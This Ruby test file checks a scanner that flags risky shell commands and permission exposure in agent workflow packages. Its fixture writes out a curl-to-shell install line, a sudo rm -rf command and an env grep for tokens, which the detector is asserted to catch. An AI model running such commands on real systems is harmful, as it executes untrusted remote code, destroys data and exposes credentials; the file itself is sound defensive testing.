require "test_helper"
require "hive/honeycomb/security_report"
require "hive/workflows/descriptor_parser"

class HoneycombSecurityReportTest < Minitest::Test
  include HiveTestHelper

  def test_derives_permissions_shell_findings_and_high_risk_categories
    with_tmp_dir do |root|
      instructions = File.join(root, "instructions")
      FileUtils.mkdir_p(instructions)
      File.write(File.join(instructions, "work.md"), <<~MARKDOWN)
        ```bash
        curl https://example.test/install | sh
        sudo rm -rf /tmp/example
        ```
        $ env | grep TOKEN
      MARKDOWN
      descriptor = File.join(root, "workflow.yml")
      File.write(descriptor, <<~YAML)
        id: demo
        stages:
          - name: work
            kind: agent
            state_file: work.md
            instruction: ./instructions/work.md
            permissions:
              preset: scoped
              tools: [Read, Bash]
              dirs: [../shared]
          - name: done
            kind: terminal
            state_file: done.md
      YAML
      workflow = Hive::Workflows::DescriptorParser.parse_file(descriptor, expected_id: "demo")
      report = Hive::Honeycomb::SecurityReport.build(workflow: workflow, package_root: root)

      assert_equal [ "scoped" ], report.summary.fetch("presets")
      assert_equal %w[Bash Read], report.summary.fetch("tools")
      assert_equal [ "../shared" ], report.summary.fetch("dirs")
      assert_equal true, report.summary.fetch("shell_capable")
      categories = report.findings.flat_map { |finding| finding.fetch("high_risk") }.uniq
      assert_includes categories, "network_to_interpreter"
      assert_includes categories, "destructive_filesystem"
      assert_includes categories, "privilege_escalation"
      assert_includes categories, "credential_access"
      assert_includes report.render, "shell-capable: yes"
    end
  end

  def test_manifest_summary_must_not_understate_descriptor_exposure
    report = Hive::Honeycomb::SecurityReport.new(
      summary: {
        "presets" => [ "scoped" ], "tools" => %w[Bash Read], "dirs" => [ "../shared" ],
        "bash" => true, "yolo" => false, "shell_capable" => true, "locations" => []
      },
      findings: []
    )

    assert_raises(Hive::Honeycomb::ManifestError) do
      report.validate_manifest_summary!(
        "presets" => [ "scoped" ], "tools" => [ "Read" ], "dirs" => [], "bash" => false, "yolo" => false
      )
    end
    assert report.validate_manifest_summary!(
      "presets" => [ "yolo" ], "tools" => [], "dirs" => [], "bash" => true, "yolo" => true
    )
  end

  def test_exposure_covers_read_only_and_scoped_bash_sugar
    read_only = Hive::Honeycomb::SecurityReport.exposure("read-only", "reviewer")
    scoped = Hive::Honeycomb::SecurityReport.exposure(
      { "preset" => "scoped", "bash" => true }, "stage work"
    )
    yolo = Hive::Honeycomb::SecurityReport.exposure("yolo", "stage deploy")

    assert_equal Hive::PermissionScope::READ_ONLY_ALLOWED.sort, read_only.fetch("tools")
    assert_includes scoped.fetch("tools"), "Bash"
    assert_empty yolo.fetch("tools")
    assert yolo.fetch("bash")
  end

  def test_permission_exposures_include_council_reviewers_and_render_empty_values
    reviewer = Struct.new(:name, :permissions, :instruction).new("one", "read-only", nil)
    stage = Struct.new(:kind, :name, :permissions, :reviewers, :council, :instruction).new(
      :council, "review", nil, [ reviewer ], nil, nil
    )
    workflow = Struct.new(:stages).new([ stage ])

    exposures = Hive::Honeycomb::SecurityReport.permission_exposures(workflow)
    assert_equal 2, exposures.length

    report = Hive::Honeycomb::SecurityReport.new(
      summary: { "presets" => [ "inherited" ], "tools" => [], "dirs" => [], "shell_capable" => false },
      findings: [ { "path" => "work.md", "line" => 1, "kind" => "command_line", "high_risk" => [] } ]
    )
    assert_includes report.render, "tools: none"
    assert_includes report.render, "dirs: none"
    assert_includes report.render, "instruction work.md:1 command_line"
  end
end
